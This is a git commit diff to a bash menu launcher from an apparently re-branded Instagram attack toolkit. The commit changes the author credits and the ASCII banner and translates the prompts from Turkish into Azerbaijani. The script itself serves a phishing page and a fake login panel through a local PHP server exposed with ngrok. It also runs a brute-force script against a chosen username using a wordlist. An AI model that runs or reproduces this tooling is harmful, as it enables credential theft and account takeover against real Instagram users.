8ccd18abef19e17486b28c90964db37fa1a68958
Nihat 「 FARZ 」 <99778063+NihatFarz@users.noreply.github.com>
2022-03-09 02:54:47 +0400

    「 FARZ 」

--- Site/Instagram/start.sh
+++ Site/Instagram/start.sh
@@ -1,70 +1,70 @@
 #!/bin/bash|
-#Code:Yaman Efkar
-#Türk Siber Timi
-#İnstagram : @turksibertimi
-#Youtube : YamanEfkar
+#TEST
+#Developer:Nihat 「 FARZ 」
+#İnstagram : @NihatFarz
+#Telegram : NihatFarz
 
 clear
 
 echo -e '\033[32;40;1m
-        /\︵-︵/\
-        |( ◉)(◉)|
-        \ ︶V︶ /
-        /↺↺↺↺↺↺↺\
-        ↺↺↺↺↺↺↺↺|
-        \↺↺↺↺↺↺↺/
-        ¯¯/\¯/\¯¯ '
-
+        ███████╗ █████╗ ██████╗ ███████╗
+        ██╔════╝██╔══██╗██╔══██╗╚══███╔╝
+        █████╗  ███████║██████╔╝  ███╔╝ 
+        ██╔══╝  ██╔══██║██╔══██╗ ███╔╝  
+        ██║     ██║  ██║██║  ██║███████╗
+        ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
+        
+	
 
 
 echo -e "\033[31;40;1m
 \033[31;40;1m[01]\e[37mİnstagram Phishing          \033[31;40;1m[02]\e[37mİnstagram Brute-Force
 \033[31;40;1m[03]\e[37mİnstagram Fake Panel
-\e[31m[00]\e[37m Menü
-\e[31m[99]\e[37m Exit
+\e[31m[00]\e[37m Menyu
+\e[31m[99]\e[37m Çıxış
 "
-echo -e "\033[32;40;1m                      ~~~Yaman Efkar~~~"
+echo -e "\033[32;40;1m                     Nihat 「 FARZ 」"
 echo ""
-read -p "İslem Numarası : " islem
+read -p "Seçim Edin : " islem
 if [[ $islem == 1 || $islem == 01 ]]; then
-        read -p "Port Giriniz: " port
+        read -p "Port Girin: " port
         echo -e "\e[32mCode: insta01"
 	sleep 2
 	echo ""
-	echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
+	echo -e "\e[33mPhp Server && Ngrok Service Başladılır..."
 	sleep 4
 	cd Instagram-phishing/
 	php -S 127.0.0.1:$port > -t & ngrok http $port
 elif [[ $islem == 2 || $islem == 02 ]]; then
         cd  Instagram-bruteforce/
-        read -p "Hedef Kullanıcının Username : " username
+        read -p "Hədəf İstifadəçinin Username : " username
         echo ""
-        read -p "Wordlist'in Bulunduğu Dizin : " password
+        read -p "Wordlist'in olduğu bölmə : " password
         python3 instagram.py $username $password -m 3
 
 elif [[ $islem == 3 || $islem == 03 ]]; then
         site="Instagram-fakepanel/"
-        read -p "Port Giriniz: " port
+        read -p "Port Girin: " port
         echo -e "\e[32mCode: insta02"
 	sleep 2
 	echo ""
-	echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
+	echo -e "\e[33mPhp Server && Ngrok Service Başladılır..."
 	sleep 4
 	cd Instagram-fakepanel/
 	php -S 127.0.0.1:$port > -t & ngrok http $port
 	elif [[ $islem == 9 || $islem == 99 ]]; then
 	clear
-	echo -e "\e[31mTürk Siber Timi İyi Günler Diler :)) ßß"
+	echo -e "\e[31mKanalımızı İzləmədə qalın @MaragliWeb :)) ßß"
 	sleep 1 
 	exit 1
 elif [[ $islem == 00 ]]; then
 	cd ..
 	cd ..
-	bash tst.sh
+	bash farz.sh
 
 
 else
-	echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
+	echo -e '\033[31;40;1m Seçiminizi düzgün edin!'
 	sleep 2
 	clear
 	bash start.sh
